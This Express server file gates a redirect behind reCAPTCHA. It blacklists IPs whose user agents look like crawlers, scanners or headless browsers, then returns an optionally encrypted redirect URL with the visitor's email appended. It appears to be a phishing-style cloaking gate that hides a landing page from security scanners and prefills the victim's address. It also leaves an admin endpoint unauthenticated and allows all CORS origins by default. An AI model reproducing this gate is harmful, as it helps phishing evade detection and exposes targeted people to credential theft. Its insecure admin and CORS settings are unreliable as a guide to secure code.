import express from 'express';
import axios from 'axios';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import morgan from 'morgan';
import { setDefaultResultOrder } from 'dns';
import crypto from 'crypto';

// =====================
// CRITICAL RAILWAY FIXES
// =====================
setDefaultResultOrder('ipv4first');

const app = express();
const PORT = process.env.PORT || 8080;

// =====================
// SECURITY CONFIGURATION
// =====================

// IP Blacklist (in production, use Redis)
const ipBlacklist = new Set();
const suspiciousPatterns = [
  'bot', 'crawler', 'spider', 'scraper', 'headless',
  'phantom', 'selenium', 'puppeteer', 'playwright'
];

// =====================
// ENHANCED MIDDLEWARE
// =====================
app.set('trust proxy', 1);

// Enhanced CORS with dynamic origin validation
app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = process.env.FRONTEND_URL ? 
      process.env.FRONTEND_URL.split(',') : ['*'];
    
    if (!origin || allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));

app.use(express.json());
app.use(morgan('combined'));

// Enhanced rate limiting with IP reputation
const enhancedRateLimit = rateLimit({
  windowMs: 60 * 1000,
  max: 50, // Reduced for better security
  message: { success: false, error: 'Too many verification attempts' },
  keyGenerator: (req) => {
    // Use fingerprint + IP for better tracking
    const fingerprint = req.headers['x-fingerprint'] || 'unknown';
    return `${req.ip}-${fingerprint}`;
  },
  skip: (req) => ipBlacklist.has(req.ip),
  standardHeaders: true,
  legacyHeaders: false
});

// =====================
// SECURITY UTILITIES
// =====================

// Bot detection middleware
app.use((req, res, next) => {
  const userAgent = req.headers['user-agent']?.toLowerCase() || '';
  const ip = req.ip;
  
  // Check IP blacklist
  if (ipBlacklist.has(ip)) {
    return res.status(403).json({ 
      success: false, 
      error: 'Access denied' 
    });
  }
  
  // Detect suspicious user agents
  const isSuspicious = suspiciousPatterns.some(pattern => 
    userAgent.includes(pattern)
  );
  
  if (isSuspicious) {
    ipBlacklist.add(ip);
    console.log(`🚫 Blacklisted suspicious IP: ${ip}, User-Agent: ${userAgent}`);
    return res.status(403).json({ 
      success: false, 
      error: 'Automated access detected' 
    });
  }
  
  // Validate fingerprint if provided
  const fingerprint = req.headers['x-fingerprint'];
  if (fingerprint && !isValidFingerprint(fingerprint)) {
    return res.status(403).json({ 
      success: false, 
      error: 'Invalid client signature' 
    });
  }
  
  next();
});

// Fingerprint validation
function isValidFingerprint(fingerprint) {
  // Basic validation - extend based on your fingerprinting logic
  return fingerprint && fingerprint.length > 10 && fingerprint.length < 200;
}

// ChaCha20 Encryption
function encryptPayload(payload, key) {
  try {
    const iv = crypto.randomBytes(12);
    const cipherKey = crypto.createHash('sha256').update(key).digest();
    const cipher = crypto.createCipheriv('chacha20-poly1305', cipherKey, iv);
    
    let encrypted = cipher.update(JSON.stringify(payload), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    
    return {
      iv: iv.toString('hex'),
      data: encrypted,
      authTag: authTag.toString('hex'),
      success: true
    };
  } catch (error) {
    console.error('Encryption error:', error);
    return payload; // Fallback to unencrypted
  }
}

function decryptPayload(encryptedData, key) {
  try {
    const decipherKey = crypto.createHash('sha256').update(key).digest();
    const decipher = crypto.createDecipheriv('chacha20-poly1305',
      decipherKey,
      Buffer.from(encryptedData.iv, 'hex'));
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return JSON.parse(decrypted);
  } catch (error) {
    console.error('Decryption error:', error);
    throw new Error('Failed to decrypt payload');
  }
}

// =====================
// ENHANCED ROUTES
// =====================
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ready',
    timestamp: new Date().toISOString(),
    ipMode: 'ipv4-only',
    security: 'enhanced',
    blacklistedIPs: ipBlacklist.size
  });
});

// Enhanced verification endpoint
app.post('/verify-token', enhancedRateLimit, async (req, res) => {
  const { token, email, fingerprint, clientData } = req.body;
  const secret = process.env.RECAPTCHA_SECRET;

  // Validate token format
  if (typeof token !== 'string' || token.length < 10) {
    return res.status(400).json({ success: false, error: 'Invalid token format' });
  }

  if (!secret) {
    return res.status(500).json({ success: false, error: 'Server configuration error' });
  }

  try {
    // Enhanced reCAPTCHA verification with dynamic headers
    const response = await axios.post(
      'https://www.google.com/recaptcha/api/siteverify',
      new URLSearchParams({ secret, response: token }),
      { 
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'application/json, text/plain, */*'
        },
        timeout: 2500 
      }
    );

    const { success, score, 'error-codes': errors = [] } = response.data;

    // Enhanced score validation
    if (!success) {
      return res.status(403).json({
        success: false,
        reason: 'reCAPTCHA verification failed',
        errors,
        score: score || 0
      });
    }

    if (score < 0.5) {
      return res.status(403).json({
        success: false,
        reason: 'Low reCAPTCHA score (minimum: 0.5)',
        score,
        requiredScore: 0.5
      });
    }

    // Build redirect URL with base64 email
    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
    if (email) {
      redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
    }

    // Enhanced response with encryption
    const responseData = {
      success: true,
      redirect: redirectUrl,
      score,
      timestamp: Date.now(),
      sessionId: crypto.randomBytes(16).toString('hex')
    };

    // Encrypt response if encryption key is available
    const encryptionKey = process.env.ENCRYPTION_KEY;
    if (encryptionKey) {
      const encryptedResponse = encryptPayload(responseData, encryptionKey);
      return res.json(encryptedResponse);
    }

    return res.json(responseData);

  } catch (err) {
    console.error('Enhanced reCAPTCHA API Error:', err.message);
    
    // Generic error to avoid information leakage
    return res.status(502).json({ 
      success: false, 
      error: 'Verification service temporarily unavailable'
    });
  }
});

// Admin endpoints for blacklist management
app.post('/admin/blacklist', (req, res) => {
  const { ip, action, auth } = req.body;
  
  // Simple admin authentication
  if (auth !== process.env.ADMIN_SECRET) {
    return res.status(401).json({ success: false, error: 'Unauthorized' });
  }
  
  if (action === 'add' && ip) {
    ipBlacklist.add(ip);
    console.log(`✅ Added IP to blacklist: ${ip}`);
  } else if (action === 'remove' && ip) {
    ipBlacklist.delete(ip);
    console.log(`✅ Removed IP from blacklist: ${ip}`);
  } else if (action === 'list') {
    // Return current blacklist
    return res.json({ 
      success: true, 
      blacklisted: Array.from(ipBlacklist) 
    });
  }
  
  res.json({ 
    success: true, 
    message: `Blacklist ${action} operation completed`,
    totalBlacklisted: ipBlacklist.size
  });
});

// Blacklist status endpoint
app.get('/admin/blacklist-status', (req, res) => {
  res.json({
    success: true,
    totalBlacklisted: ipBlacklist.size,
    blacklistedIPs: Array.from(ipBlacklist)
  });
});

// =====================
// SERVER START
// =====================
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Enhanced server running on http://0.0.0.0:${PORT}`);
  console.log(`🔒 Advanced security features enabled`);
  console.log(`📊 IP Blacklist entries: ${ipBlacklist.size}`);
  console.log(`🌐 Frontend URL: ${process.env.FRONTEND_URL || 'All origins allowed'}`);
  console.log(`🔑 Encryption: ${process.env.ENCRYPTION_KEY ? 'Enabled' : 'Disabled'}`);
});

server.keepAliveTimeout = 60000;
server.headersTimeout = 65000;

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 Received shutdown signal');
  server.close(() => {
    console.log('✅ Server terminated cleanly');
    process.exit(0);
  });
});